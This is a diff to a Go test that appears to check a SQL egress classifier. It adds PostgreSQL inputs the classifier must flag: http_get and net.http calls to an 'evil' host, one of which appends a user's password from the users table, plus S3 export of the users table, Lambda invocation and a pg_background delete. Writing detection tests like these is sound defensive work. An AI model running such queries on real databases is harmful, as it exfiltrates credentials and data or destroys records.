@@ -15,6 +15,15 @@ func TestClassifySQLEgress(t *testing.T) {
 			"WITH a AS (SELECT dblink_exec('x','y')) SELECT 1", "SELECT lo_import('//evil/x')",
 			"IMPORT FOREIGN SCHEMA public FROM SERVER s INTO x", "CREATE SUBSCRIPTION s CONNECTION 'host=evil' PUBLICATION p",
 			"CREATE SERVER s FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'evil')",
+			// extensions that fetch URLs, call cloud services or run SQL outside
+			// komando's read-only transaction
+			"SELECT content FROM http_get('http://evil/?d=' || (SELECT pw FROM users LIMIT 1))",
+			"SELECT * FROM http(('GET', 'http://evil', NULL, NULL, NULL)::http_request)",
+			"SELECT extensions.http_post('http://evil', 'x', 'text/plain')", "SELECT http_head('http://evil')",
+			"SELECT net.http_get('http://evil')", "SELECT net.http_post(url := 'http://evil')",
+			"SELECT aws_s3.query_export_to_s3('select * from users', aws_commons.create_s3_uri('b', 'k', 'r'))",
+			"SELECT * FROM aws_lambda.invoke('fn', '{}'::json)", `SELECT "aws_s3"."table_import_from_s3"('t', '', '', 'b', 'k', 'r')`,
+			"SELECT pg_background_launch('delete from t')", "SELECT * FROM pg_background_result(1) AS (x text)",
 		},
 		"mysql": {
 			"SELECT * INTO OUTFILE '/tmp/x' FROM t", "SELECT 1 INTO DUMPFILE '/tmp/x'",
